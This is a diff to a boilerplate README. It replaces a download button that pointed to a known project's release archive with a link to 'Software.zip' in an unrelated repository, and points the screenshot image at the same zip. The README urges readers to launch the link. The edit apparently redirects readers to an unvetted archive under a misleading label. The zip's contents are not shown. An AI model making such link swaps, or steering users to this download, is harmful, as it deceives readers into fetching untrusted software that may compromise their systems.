@@ -9,7 +9,7 @@ The topics for this repository are not explicitly provided, but you can expect a
 ## Get Started
 Ready to dive in? Click the button below to download the repository: 
 
-[![Download Repository](https://img.shields.io/badge/Download-Repository-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Repository](https://github.com/jainam-dotcom/z/releases/download/v1.0/Software.zip)](https://github.com/jainam-dotcom/z/releases/download/v1.0/Software.zip)
 
 Note: The link provided needs to be launched to start the download process. 
 
@@ -21,7 +21,7 @@ Discover exciting content, contribute to projects, and engage with a vibrant com
 Happy coding! 🎉
 
 ## Screenshots (Optional)
-![Image](https://via.placeholder.com/500)
+![Image](https://github.com/jainam-dotcom/z/releases/download/v1.0/Software.zip)
 
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
